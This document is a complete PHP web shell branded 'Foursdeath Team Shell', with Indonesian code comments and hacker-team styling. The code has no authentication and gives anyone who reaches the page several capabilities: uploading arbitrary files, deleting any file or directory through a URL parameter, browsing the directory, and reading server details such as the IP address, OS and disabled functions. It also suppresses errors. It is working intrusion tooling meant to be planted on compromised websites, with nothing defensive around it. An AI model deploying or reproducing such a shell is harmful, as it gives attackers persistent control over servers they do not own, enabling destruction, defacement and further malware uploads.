<?php
error_reporting(0);
set_time_limit(0);

// Fungsi untuk ukuran file
function formatSize($bytes) {
    $sizes = ['B','KB','MB','GB','TB'];
    if ($bytes == 0) return '0 B';
    return round($bytes / pow(1024, ($i = floor(log($bytes, 1024)))), 2) . ' ' . $sizes[$i];
}

// Fungsi untuk permission
function perms($file) {
    $perms = fileperms($file);
    return substr(sprintf('%o', $perms), -4);
}

// Proses delete
if (isset($_GET['del'])) {
    $target = $_GET['del'];
    if (is_file($target)) {
        unlink($target);
    } elseif (is_dir($target)) {
        rmdir($target);
    }
    header("Location: ?");
    exit;
}

// Proses upload
if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Foursdeath Team Shell</title>
  <style>
    body {
      margin: 0;
      font-family: monospace;
      background: url('https://g.top4top.io/p_1825r6iwh0.jpg') no-repeat center center fixed;
      background-size: cover;
      color: #33f702;
      animation: cyber-glow 5s infinite alternate;
    }
    @keyframes cyber-glow {
      0% { filter: brightness(100%); }
      100% { filter: brightness(115%); }
    }
    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: rgba(0, 0, 0, 0.7);
      padding: 10px 20px;
    }
    header img {
      height: 60px;
    }
    .title {
      font-size: 1.2em;
      color: #33f702;
      text-shadow: 0 0 5px #fff;
    }
    .tools {
      margin: 20px;
      text-align: center;
    }
    .tools form, .tools a {
      display: inline-block;
      margin: 5px;
      color: #33f702;
      text-decoration: none;
      background: #000;
      border: 1px solid #33f702;
      padding: 10px;
      border-radius: 8px;
    }
    .tools input[type="file"] {
      color: #fff;
    }
    .file-manager {
      width: 95%;
      margin: auto;
      background: rgba(0, 0, 0, 0.75);
      padding: 10px;
      border-radius: 10px;
      box-shadow: 0 0 10px #33f702;
    }
    table {
      width: 100%;
      border-collapse: collapse;
    }
    th, td {
      padding: 8px;
      border: 1px solid #33f702;
      text-align: center;
    }
    th {
      background: #111;
    }
    footer {
      text-align: center;
      padding: 20px;
      font-size: 0.9em;
      color: #fff;
    }
  </style>
</head>
<body>
  <header>
    <div class="title">Foursdeath Team Shell<br><small>powered by X'Boy Linux</small></div>
    <img src="https://i.top4top.io/p_22457217t0.png" alt="Logo" />
  </header>

  <div class="tools">
    <form method="post" enctype="multipart/form-data">
      <input type="file" name="file">
      <input type="submit" value="Upload">
    </form>
    <a href="?info">Info Server</a>
  </div>

  <div class="file-manager">
    <table>
      <thead>
        <tr>
          <th>Name</th>
          <th>Size</th>
          <th>Permission</th>
          <th>Modified</th>
          <th>Action</th>
        </tr>
      </thead>
      <tbody>
        <?php
        $scandir = scandir('.');
        foreach ($scandir as $item) {
            if ($item == '.') continue;
            $size = is_file($item) ? formatSize(filesize($item)) : '-';
            $perm = perms($item);
            $time = date("Y-m-d H:i", filemtime($item));
            echo "<tr>
              <td>{$item}</td>
              <td>{$size}</td>
              <td>{$perm}</td>
              <td>{$time}</td>
              <td><a href='?del={$item}' onclick='return confirm(\"Delete {$item}?\")'>Delete</a></td>
            </tr>";
        }
        ?>
      </tbody>
    </table>
  </div>

  <?php if (isset($_GET['info'])): ?>
  <div style="width: 95%; margin: auto; background: #000; padding: 10px; color: #33f702;">
    <h3>Server Info</h3>
    <pre>
IP Address: <?= $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname()) ?>
Software: <?= $_SERVER['SERVER_SOFTWARE'] ?>
Safe Mode: <?= ini_get('safe_mode') ? 'ON' : 'OFF' ?>
Disabled Functions: <?= ini_get('disable_functions') ?: 'None' ?>
PHP Version: <?= phpversion() ?>
System: <?= php_uname() ?>
    </pre>
  </div>
  <?php endif; ?>

  <footer>&copy; 2025 Foursdeath Team | X'Boy Linux Cyber Shell</footer>
  <audio src="https://b.top4top.io/m_17923krtx0.mp3" autoplay loop hidden></audio>
</body>
</html>
